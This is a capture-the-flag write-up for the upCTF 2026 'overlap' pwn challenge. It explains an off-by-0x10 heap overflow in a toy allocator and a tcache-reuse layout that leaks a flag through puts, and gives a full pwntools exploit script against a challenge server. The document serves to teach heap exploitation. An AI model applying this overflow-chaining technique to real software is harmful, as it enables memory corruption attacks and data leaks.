# overlap — upCTF 2026

**Category:** PWN
**Flag:** `upCTF{h34d3r_1nclud3d_by_m4ll0c-<random>}` (random suffix per instance)

## TL;DR

Heap allocator with a 16-byte overflow due to a bug in `ptr_size_table[i] = size + 0x10`. Overflows between adjacent chunks are chained to create a continuous read (via `puts`) that traverses chunk headers until reaching the flag stored in an orphaned heap chunk.

---

## Binary Analysis

```
ELF 64-bit LSB PIE, x86-64, glibc 2.35
Full RELRO | Stack Canary | NX | PIE
```

### Functionality

| Option | Function | Description |
|--------|---------|-------------|
| 1 | `manage_allocation` | `malloc(size)` with size 0-0x420, stores ptr and size+0x10 |
| 2 | `clear_memory` | `free(ptr)` + nullifies ptr and size (no UAF) |
| 3 | `read_operation` | `puts(ptr_table[idx])` — reads until null byte |
| 4 | `write_operation` | Writes `ptr_size_table[idx]` bytes to the chunk via getchar loop |
| 5 | quit | Exits the program |
| f | `read_flag` | `malloc(0x2b1)`, reads flag.txt, does not store pointer nor free |

### Vulnerability (CWE-122: Heap Buffer Overflow)

In `manage_allocation`:
```c
ptr_size_table[counter] = size + 0x10;  // BUG: stores size+16
```

`write_operation` uses `ptr_size_table[idx]` as the write limit. This allows writing **16 bytes beyond** the chunk's actual space, corrupting the next chunk's header.

### `read_flag` Primitive

```c
void read_flag() {
    FILE *f = fopen("flag.txt", "r");
    char *buf = malloc(0x2b1);       // chunk of 0x2c0
    fread(buf, 1, 0x2b0, f);
    buf[bytes_read] = '\0';
    fclose(f);
    // buf is never freed nor stored in ptr_table → orphaned on heap
}
```

The flag remains on the heap but is not directly accessible.

---

## Strategy: Heap Overlap via Chained Header Overwrites

### Heap Layout

```
Offset  Chunk    Size   Description
0x290   A (idx0) 0x20   Padding
0x2b0   B (idx1) 0x20   Padding
0x2d0   C (idx2) 0x20   Read target (puts reads from here)
0x2f0   X (idx3) 0x20   Bridge chunk
0x310   D (idx4) 0x2c0  Flag chunk (same tcache bin as read_flag)
0x5d0   E (idx5) 0x20   Guard (prevents consolidation with top)
```

### Steps

1. **Alloc A, B, C, X, D(0x2b0), E** — creates contiguous layout
2. **Free D** → goes to `tcache[0x2c0]`
3. **Trigger 'f'** → `malloc(0x2b1)` reuses D from tcache, flag written to D_data
4. **Overflow X(3) with 0x20 bytes** → fills X_data(0x18) + D_size(0x8) with non-null
   - Key: only 0x20 bytes, NOT 0x28 — the last 8 bytes of the overflow would touch D_data (flag)
5. **Overflow C(2) with 0x28 bytes** → fills C_data(0x18) + X_header(0x10) with non-null
6. **Read C(2)** → `puts` traverses memory without null bytes:

```
C_data (0x18) → X_prev_size (0x08) → X_size (0x08) → X_data (0x18) → D_size (0x08) → D_data = FLAG
   \x42 * 24      \x42 * 8             \x42 * 8          \x42 * 24       \x42 * 8        flag{...}
                                                                                    ↑
                                                                              puts continues here
```

Total: 64 bytes of padding + complete flag.

### Critical Detail: 0x20 vs 0x28

The overflow from X allows 0x28 bytes (0x18 data + 0x10 overflow). However:
- Bytes 0x00-0x17: X_data
- Bytes 0x18-0x1F: D_size field
- Bytes 0x20-0x27: **D_data[0..7] = first 8 bytes of the flag!**

Writing 0x28 destroys the first 8 characters of the flag. Writing only 0x20 preserves the flag intact.

---

## Exploit

```python
#!/usr/bin/env python3
from pwn import *
import re

io = remote('46.225.117.62', 30019)

def wait_menu():
    io.recvuntil(b'option: \n')

def malloc(size):
    io.sendline(b'1')
    io.recvuntil(b'size: \n')
    io.sendline(str(size).encode())
    wait_menu()

def free(idx):
    io.sendline(b'2')
    io.recvuntil(b'(0-9): \n')
    io.sendline(str(idx).encode())
    wait_menu()

def write_chunk(idx, data):
    io.sendline(b'4')
    io.recvuntil(b'(0-9): \n')
    io.sendline(str(idx).encode())
    io.recvuntil(b'text:\n')
    io.sendline(data)
    wait_menu()

def flag_cmd():
    io.sendline(b'f')
    wait_menu()

wait_menu()

malloc(0x18)   # idx 0 - A
malloc(0x18)   # idx 1 - B
malloc(0x18)   # idx 2 - C (read target)
malloc(0x18)   # idx 3 - X (bridge)
malloc(0x2b0)  # idx 4 - D (flag chunk)
malloc(0x18)   # idx 5 - E (guard)

free(4)                            # D → tcache[0x2c0]
flag_cmd()                         # flag reuses D

write_chunk(3, b'\x42' * 0x20)    # X_data + D_size (preserves flag)
write_chunk(2, b'\x42' * 0x28)    # C_data + X_header

io.sendline(b'3')
io.recvuntil(b'(0-9): \n')
io.sendline(b'2')
sleep(0.5)
data = io.recv(4096, timeout=3)

# Strip padding, extract flag
pad_end = next(i for i, b in enumerate(data) if b != 0x42)
flag_data = data[pad_end:].split(b'\n')[0]
m = re.search(rb'[\w]+\{[^\}]+\}', flag_data)
if m:
    print(f"FLAG: {m.group().decode()}")

io.close()
```

---

## Discarded Approaches

| # | Approach | Why it didn't work |
|---|----------|---------------------|
| 1 | Overflow A → change B size → free B with fake size → consolidate with top → re-malloc overlapping flag | glibc 2.35 validates next chunk on free, crash due to corrupted size |
| 2 | Single overflow C → D header (0x28 bytes) | Only covers 0x10 of D_header, but D_size has null bytes → puts stops before the flag |
| 3 | Chain C+X overflow with 0x28 in X | The last 8 bytes of the overflow destroy the first 8 chars of the flag |

---

## Key Lessons

1. **Off-by-0x10 in size tracking** is sufficient for a heap overlap without metadata corruption
2. Chaining overflows between adjacent chunks creates an extended read primitive with `puts`
3. Controlling the exact overflow size is critical — 0x20 vs 0x28 is the difference between a complete and partial flag
4. tcache reuse is predictable: free a chunk of size X, malloc(X) reclaims it
5. `fopen`/`fclose` do not interfere with the layout if the target chunk is already in tcache

## References

- [glibc malloc internals](https://sourceware.org/glibc/wiki/MallocInternals)
- [Heap Exploitation - tcache](https://github.com/shellphish/how2heap)
